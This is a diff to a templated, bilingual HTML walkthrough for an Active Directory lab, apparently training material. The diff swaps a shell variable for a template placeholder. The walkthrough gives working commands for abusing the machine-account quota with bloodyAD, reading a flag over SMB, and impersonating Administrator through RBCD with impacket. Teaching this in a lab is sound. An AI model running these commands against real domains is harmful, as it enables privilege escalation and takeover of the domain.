@@ -26,30 +26,27 @@ bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadO
     <p>El atributo de dominio <code>ms-DS-MachineAccountQuota</code> (por defecto <strong>10</strong>) define cuántas cuentas de equipo puede crear un usuario cualquiera. No es una vulnerabilidad por sí sola, pero es la pieza que habilita ataques como <em>Resource-Based Constrained Delegation</em> (RBCD) y <em>noPac</em>: una cuenta de máquina bajo tu control es un principal Kerberos de pleno derecho que tú manejas.</p>
 
     <h3>2 · Comprobar la cuota</h3>
-    <pre>export DC={{ ad_dc_ip }}
-export BASEDN='DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}'
-
-# nxc ldap -M maq no funciona contra este DC (falla el bind NTLM, ver AD 02); ldapsearch sí:
-ldapsearch -x -H ldap://$DC -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
-  -b "$BASEDN" -s base '(objectClass=*)' 'ms-DS-MachineAccountQuota'
+    <pre># nxc ldap -M maq no funciona contra este DC (falla el bind NTLM, ver AD 02); ldapsearch sí:
+ldapsearch -x -H ldap://{{ ad_dc_ip }} -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
+  -b "DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}" -s base '(objectClass=*)' 'ms-DS-MachineAccountQuota'
 # ms-DS-MachineAccountQuota: 10   → &gt; 0 significa que podemos crear equipos</pre>
 
     <h3>3 · Crear una cuenta de máquina</h3>
-    <pre>bloodyAD --host $DC -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadOnly123!' \
+    <pre>bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadOnly123!' \
   add computer evilpc 'Evil1234!'
 # [+] evilpc$ created
 
 # Verifica que existe y que puedes autenticarte como esa máquina
-nxc smb $DC -u 'evilpc$' -p 'Evil1234!'
-nxc smb $DC -u 'evilpc$' -p 'Evil1234!' --shares</pre>
+nxc smb {{ ad_dc_ip }} -u 'evilpc$' -p 'Evil1234!'
+nxc smb {{ ad_dc_ip }} -u 'evilpc$' -p 'Evil1234!' --shares</pre>
     <p>La versión de impacket (<code>impacket-addcomputer</code>, método SAMR por defecto) también existe, pero el SAMR de Samba exige privilegios adicionales que un usuario normal no tiene aunque la cuota lo permita — usa <code>-method LDAPS</code> si prefieres impacket, o directamente <code>bloodyAD</code> como arriba.</p>
 
     <h3>4 · Capturar la flag</h3>
     <p>El recurso <code>computers</code> es legible por <code>Domain Computers</code>, grupo del que tu nueva máquina es miembro automáticamente:</p>
-    <pre>smbclient //$DC/computers -U '{{ ad_domain }}\evilpc$%Evil1234!' -c 'get flag-ad-15.txt -'
+    <pre>smbclient //{{ ad_dc_ip }}/computers -U '{{ ad_domain }}\evilpc$%Evil1234!' -c 'get flag-ad-15.txt -'
 
 # o con netexec
-nxc smb $DC -u 'evilpc$' -p 'Evil1234!' \
+nxc smb {{ ad_dc_ip }} -u 'evilpc$' -p 'Evil1234!' \
   --share computers --get-file flag-ad-15.txt ./flag-ad-15.txt && cat flag-ad-15.txt</pre>
     <pre>HL{···}</pre>
 
@@ -57,10 +54,10 @@ nxc smb $DC -u 'evilpc$' -p 'Evil1234!' \
     <p>Con una cuenta de máquina propia y permiso de escritura sobre <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> de un equipo objetivo, se completa el clásico RBCD:</p>
     <pre># 1) Apuntar la delegación del objetivo a nuestra máquina
 impacket-rbcd -delegate-from 'evilpc$' -delegate-to '{{ ad_dc_host }}$' \
-  -action write '{{ ad_realm_lower }}/svc.readonly:ReadOnly123!' -dc-ip $DC
+  -action write '{{ ad_realm_lower }}/svc.readonly:ReadOnly123!' -dc-ip {{ ad_dc_ip }}
 # 2) Pedir un ticket suplantando a Administrator
 impacket-getST -spn 'cifs/{{ ad_dc_fqdn }}' -impersonate Administrator \
-  '{{ ad_realm_lower }}/evilpc$:Evil1234!' -dc-ip $DC</pre>
+  '{{ ad_realm_lower }}/evilpc$:Evil1234!' -dc-ip {{ ad_dc_ip }}</pre>
     <p>(El paso 2 es un TGS-REQ vía S4U, con la misma limitación conocida del KDC de Samba que afecta a Kerberoasting y la delegación restringida — comando real y válido contra un DC Windows. La flag de este lab ya se captura en el paso 4.)</p>
 
     <h3>Mitigación</h3>
@@ -79,30 +76,27 @@ impacket-getST -spn 'cifs/{{ ad_dc_fqdn }}' -impersonate Administrator \
     <p>The domain attribute <code>ms-DS-MachineAccountQuota</code> (default <strong>10</strong>) sets how many computer accounts any user can create. It is not a vulnerability on its own, but it is the enabler for attacks like <em>Resource-Based Constrained Delegation</em> (RBCD) and <em>noPac</em>: a machine account under your control is a first-class Kerberos principal you own.</p>
 
     <h3>2 · Check the quota</h3>
-    <pre>export DC={{ ad_dc_ip }}
-export BASEDN='DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}'
-
-# nxc ldap -M maq no funciona contra este DC (falla el bind NTLM, ver AD 02); ldapsearch sí:
-ldapsearch -x -H ldap://$DC -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
-  -b "$BASEDN" -s base '(objectClass=*)' 'ms-DS-MachineAccountQuota'
+    <pre># nxc ldap -M maq no funciona contra este DC (falla el bind NTLM, ver AD 02); ldapsearch sí:
+ldapsearch -x -H ldap://{{ ad_dc_ip }} -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
+  -b "DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}" -s base '(objectClass=*)' 'ms-DS-MachineAccountQuota'
 # ms-DS-MachineAccountQuota: 10   → &gt; 0 means we can create computers</pre>
 
     <h3>3 · Create a machine account</h3>
-    <pre>bloodyAD --host $DC -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadOnly123!' \
+    <pre>bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadOnly123!' \
   add computer evilpc 'Evil1234!'
 # [+] evilpc$ created
 
 # Verify it exists and that you can authenticate as that machine
-nxc smb $DC -u 'evilpc$' -p 'Evil1234!'
-nxc smb $DC -u 'evilpc$' -p 'Evil1234!' --shares</pre>
+nxc smb {{ ad_dc_ip }} -u 'evilpc$' -p 'Evil1234!'
+nxc smb {{ ad_dc_ip }} -u 'evilpc$' -p 'Evil1234!' --shares</pre>
     <p>The impacket equivalent (<code>impacket-addcomputer</code>, default SAMR method) also exists, but Samba's SAMR requires extra privileges a regular user doesn't have even when the quota allows it — use <code>-method LDAPS</code> if you prefer impacket, or just <code>bloodyAD</code> as above.</p>
 
     <h3>4 · Capture the flag</h3>
     <p>The <code>computers</code> share is readable by <code>Domain Computers</code>, a group your new machine automatically belongs to:</p>
-    <pre>smbclient //$DC/computers -U '{{ ad_domain }}\evilpc$%Evil1234!' -c 'get flag-ad-15.txt -'
+    <pre>smbclient //{{ ad_dc_ip }}/computers -U '{{ ad_domain }}\evilpc$%Evil1234!' -c 'get flag-ad-15.txt -'
 
 # or with netexec
-nxc smb $DC -u 'evilpc$' -p 'Evil1234!' \
+nxc smb {{ ad_dc_ip }} -u 'evilpc$' -p 'Evil1234!' \
   --share computers --get-file flag-ad-15.txt ./flag-ad-15.txt && cat flag-ad-15.txt</pre>
     <pre>HL{···}</pre>
 
@@ -110,10 +104,10 @@ nxc smb $DC -u 'evilpc$' -p 'Evil1234!' \
     <p>With your own machine account and write access over a target computer's <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>, you complete the classic RBCD:</p>
     <pre># 1) Point the target's delegation at our machine
 impacket-rbcd -delegate-from 'evilpc$' -delegate-to '{{ ad_dc_host }}$' \
-  -action write '{{ ad_realm_lower }}/svc.readonly:ReadOnly123!' -dc-ip $DC
+  -action write '{{ ad_realm_lower }}/svc.readonly:ReadOnly123!' -dc-ip {{ ad_dc_ip }}
 # 2) Request a ticket impersonating Administrator
 impacket-getST -spn 'cifs/{{ ad_dc_fqdn }}' -impersonate Administrator \
-  '{{ ad_realm_lower }}/evilpc$:Evil1234!' -dc-ip $DC</pre>
+  '{{ ad_realm_lower }}/evilpc$:Evil1234!' -dc-ip {{ ad_dc_ip }}</pre>
     <p>(Step 2 is an S4U-based TGS-REQ, hitting the same known Samba KDC limitation that affects Kerberoasting and constrained delegation — a real, valid command against a Windows DC. This lab's flag is already captured at step 4.)</p>
 
     <h3>Mitigation</h3>
